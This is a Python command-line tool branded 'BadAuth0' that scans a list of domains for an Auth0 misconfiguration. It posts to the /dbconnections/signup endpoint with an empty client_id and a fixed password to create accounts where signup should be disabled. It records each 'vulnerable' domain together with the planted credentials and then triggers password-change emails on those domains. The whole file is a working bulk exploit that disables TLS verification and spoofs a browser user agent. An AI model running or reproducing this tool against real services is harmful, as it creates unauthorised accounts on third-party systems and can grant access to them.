#!/usr/bin/env python3
import os
import sys
import time
import argparse
import requests
import urllib3
from urllib.parse import urlparse
from typing import List, Optional

# ANSI color codes
class Colors:
    BLUE = "\033[94m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    END = "\033[0m"
    BOLD = "\033[1m"

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    """Display the tool banner"""
    print(rf"""{Colors.CYAN}{Colors.BOLD}
  ____            _    _   _   _ _   _      ___  
 | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \ 
 |  _ \ / _` |/ _` | / _ \| | | | __| '_ \| | | |
 | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
 |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
{Colors.END}                                                                
""")
    time.sleep(0.2)

def create_output_directory(directory: str) -> str:
    """Create directory for output files"""
    try:
        print(f"{Colors.BLUE}[*] Creating directory '{directory}'...{Colors.END}")
        os.makedirs(directory, exist_ok=True)
        abs_path = os.path.abspath(directory)
        print(f"{Colors.GREEN}[+] Directory created successfully at {abs_path}{Colors.END}")
        return abs_path
    except Exception as e:
        print(f"{Colors.RED}[-] Error creating directory: {e}{Colors.END}")
        sys.exit(1)

def normalize_domain(domain: str) -> str:
    """Normalize domain format"""
    domain = domain.strip()
    if domain.startswith(('http://', 'https://')):
        parsed = urlparse(domain)
        domain = parsed.netloc or parsed.path
    # Remove path components if present
    domain = domain.split('/')[0]
    return domain

def is_valid_domain(domain: str) -> bool:
    """Check if domain format is valid"""
    if not domain or '.' not in domain:
        return False
    # Basic domain validation - should contain at least one dot and no spaces
    if ' ' in domain or '..' in domain:
        return False
    return True

def test_auth0_endpoint(domain: str, verbose: bool = False) -> bool:
    """Test if Auth0 endpoint is accessible"""
    endpoints = [
        f"https://{domain}/dbconnections/signup",
        f"https://{domain}/oauth/token",
        f"https://{domain}/.well-known/openid-configuration"
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    
    for endpoint in endpoints:
        try:
            if verbose:
                print(f"{Colors.BLUE}[*] Testing endpoint: {endpoint}{Colors.END}")
            
            response = requests.get(
                endpoint,
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            
            if response.status_code in [200, 201, 400, 401]:
                if verbose:
                    print(f"{Colors.GREEN}[+] Endpoint accessible: {endpoint} (Status: {response.status_code}){Colors.END}")
                return True
                
        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"{Colors.YELLOW}[!] Endpoint failed: {endpoint} - {e}{Colors.END}")
            continue
    
    return False

def exploit_domain(domain: str, test_email: str, output_dir: str, verbose: bool = False) -> bool:
    """Attempt to exploit the Auth0 vulnerability on a domain"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json'
    }

    payload = {
        'client_id': '',
        'email': test_email,
        'password': 'rQ8a2;3/c[<J',  # Default password
        'connection': 'Username-Password-Authentication'
    }

    try:
        if verbose:
            print(f"{Colors.BLUE}[*] Testing domain: {domain}{Colors.END}")
        
        # First test if domain is accessible
        if not test_auth0_endpoint(domain, verbose):
            print(f"{Colors.RED}[-] Domain not accessible or not Auth0: {domain}{Colors.END}")
            return False

        print(f"{Colors.CYAN}[*] Attempting to create account on {domain}...{Colors.END}")
        
        response = requests.post(
            f'https://{domain}/dbconnections/signup',
            headers=headers,
            json=payload,
            verify=False,
            timeout=10
        )

        if response.status_code in [200, 201]:
            print(f"{Colors.GREEN}[+] VULNERABLE - Account created successfully on {domain}!{Colors.END}")
            print(f"{Colors.GREEN}    Test Email: {test_email}{Colors.END}")
            print(f"{Colors.GREEN}    Password: rQ8a2;3/c[<J{Colors.END}")
            
            # Save vulnerable domains to file
            output_file = os.path.join(output_dir, "vulnerable_domains.txt")
            with open(output_file, "a") as f:
                f.write(f"Domain: {domain}\nEmail: {test_email}\nPassword: rQ8a2;3/c[<J\n\n")
            
            if verbose:
                print(f"{Colors.BLUE}[*] Vulnerable domain saved to {output_file}{Colors.END}")
            
            return True
        else:
            print(f"{Colors.RED}[-] NOT VULNERABLE - Failed to create account on {domain} (Status: {response.status_code}){Colors.END}")
            if verbose and response.text:
                print(f"{Colors.YELLOW}[!] Response: {response.text[:200]}{Colors.END}")
            return False

    except Exception as e:
        print(f"{Colors.RED}[-] Error testing domain {domain}: {e}{Colors.END}")
        return False

def verify_email_on_domain(domain: str, test_email: str, verbose: bool = False) -> bool:
    """Send email verification request to domain"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json'
    }

    payload = {
        'email': test_email,
        'connection': 'Username-Password-Authentication'
    }

    try:
        if verbose:
            print(f"{Colors.BLUE}[*] Sending verification email to {test_email} on {domain}...{Colors.END}")
        
        response = requests.post(
            f'https://{domain}/dbconnections/change_password',
            headers=headers,
            json=payload,
            verify=False,
            timeout=10
        )

        if response.status_code in [200, 201]:
            print(f"{Colors.GREEN}[+] Verification email sent from {domain} to {test_email}{Colors.END}")
            return True
        else:
            if verbose:
                print(f"{Colors.YELLOW}[!] Failed to send verification from {domain} (Status: {response.status_code}){Colors.END}")
            return False

    except Exception as e:
        if verbose:
            print(f"{Colors.YELLOW}[!] Error during email verification on {domain}: {e}{Colors.END}")
        return False

def process_domain_list(domain_list: str, test_email: str, output_dir: str, verbose: bool = False):
    """Process a list of domains"""
    try:
        with open(domain_list, 'r') as f:
            domains = [line.strip() for line in f if line.strip()]
        
        print(f"{Colors.BLUE}[*] Processing {len(domains)} domains from {domain_list}{Colors.END}")
        print(f"{Colors.BLUE}[*] Using test email: {test_email}{Colors.END}")
        
        vulnerable_count = 0
        tested_count = 0
        
        for domain in domains:
            domain = normalize_domain(domain)
            
            if not is_valid_domain(domain):
                print(f"{Colors.YELLOW}[!] Skipping invalid domain: {domain}{Colors.END}")
                continue
            
            tested_count += 1
            print(f"\n{Colors.CYAN}[{tested_count}/{len(domains)}] Testing domain: {domain}{Colors.END}")
            
            if exploit_domain(domain, test_email, output_dir, verbose):
                vulnerable_count += 1
                # Optionally test email verification on vulnerable domains
                verify_email_on_domain(domain, test_email, verbose)
            
            time.sleep(1)  # Rate limiting
        
        print(f"\n{Colors.GREEN}[+] Testing completed!{Colors.END}")
        print(f"{Colors.GREEN}[+] Vulnerable domains: {vulnerable_count}/{tested_count}{Colors.END}")
        
        # Summary
        if vulnerable_count > 0:
            output_file = os.path.join(output_dir, "vulnerable_domains.txt")
            print(f"{Colors.GREEN}[+] Vulnerable domains saved to: {output_file}{Colors.END}")
    
    except FileNotFoundError:
        print(f"{Colors.RED}[-] File not found: {domain_list}{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-] Error processing domain list: {e}{Colors.END}")
        sys.exit(1)

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description=f"{Colors.CYAN}Auth0 Domain Vulnerability Scanner{Colors.END}",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-l', '--list', required=True, help='File containing list of domains to test')
    parser.add_argument('-e', '--email', required=True, help='Test email address to use for vulnerability testing')
    parser.add_argument('-o', '--output', default='output', help='Output directory (default: ./output)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()

    # Validate email
    if '@' not in args.email:
        print(f"{Colors.RED}[-] Invalid email address: {args.email}{Colors.END}")
        sys.exit(1)

    # Create output directory
    output_dir = create_output_directory(args.output)

    # Process domains
    process_domain_list(args.list, args.email, output_dir, args.verbose)

if __name__ == "__main__":
    main()
